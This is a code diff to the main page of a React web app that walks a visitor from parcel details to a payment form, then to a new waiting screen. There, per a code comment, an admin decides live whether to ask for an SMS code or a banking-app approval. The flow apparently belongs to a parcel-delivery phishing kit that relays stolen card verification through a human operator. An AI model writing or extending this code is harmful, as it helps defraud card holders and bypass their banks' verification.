@@ -2,6 +2,7 @@ import Header from "@/components/Header";
 import StepIndicator from "@/components/StepIndicator";
 import ParcelDetails from "@/components/ParcelDetails";
 import PaymentForm from "@/components/PaymentForm";
+import PaymentWaiting from "@/components/PaymentWaiting";
 import SmsVerification from "@/components/SmsVerification";
 import AppApproval from "@/components/AppApproval";
 import SmsConfirmation from "@/components/SmsConfirmation";
@@ -29,9 +30,9 @@ const Index = () => {
     updateStep(2);
   };
 
-  const handleProceedToVerification = (code: string) => {
-    updateVerificationCode(code);
-    updateStep(3);
+  const handleProceedToWaiting = () => {
+    // Move to waiting state - admin will decide SMS or App
+    updateStep(2, { approval_type: "payment_waiting", verification_code: null });
   };
 
   const handleProceedToConfirmation = () => {
@@ -54,6 +55,11 @@ const Index = () => {
     );
   }
 
+  // Determine what to show based on step and approval_type
+  const isPaymentWaiting = currentStep === 2 && approvalType === "payment_waiting";
+  const isAppApproval = currentStep === 3 && approvalType === "app_pending";
+  const isSmsVerification = currentStep === 3 && approvalType !== "app_pending";
+
   return (
     <div className="min-h-screen bg-background">
       <Header />
@@ -70,8 +76,8 @@ const Index = () => {
       )}
       
       <main className="container mx-auto px-4 py-8">
-        {/* Admin Alert */}
-        {adminMessage && (
+        {/* Admin Alert - show only when not on specific pages that handle their own alerts */}
+        {adminMessage && !isPaymentWaiting && !isAppApproval && !isSmsVerification && (
           <AdminAlert 
             message={adminMessage} 
             type={messageType} 
@@ -85,11 +91,21 @@ const Index = () => {
           <ParcelDetails onProceed={handleProceedToPayment} />
         )}
 
-        {currentStep === 2 && (
-          <PaymentForm onProceed={handleProceedToVerification} onBack={handleBack} />
+        {currentStep === 2 && !isPaymentWaiting && (
+          <PaymentForm onProceed={handleProceedToWaiting} onBack={handleBack} />
         )}
 
-        {currentStep === 3 && session && approvalType === "app_pending" && (
+        {isPaymentWaiting && session && (
+          <PaymentWaiting 
+            sessionCode={session.session_code}
+            clientName={session.client_name}
+            adminMessage={adminMessage}
+            messageType={messageType}
+            onDismissMessage={clearAdminMessage}
+          />
+        )}
+
+        {isAppApproval && session && (
           <AppApproval 
             sessionCode={session.session_code}
             clientName={session.client_name}
@@ -100,7 +116,7 @@ const Index = () => {
           />
         )}
 
-        {currentStep === 3 && session && approvalType !== "app_pending" && (
+        {isSmsVerification && session && (
           <SmsVerification 
             onBack={handleBack} 
             sessionCode={session.session_code}
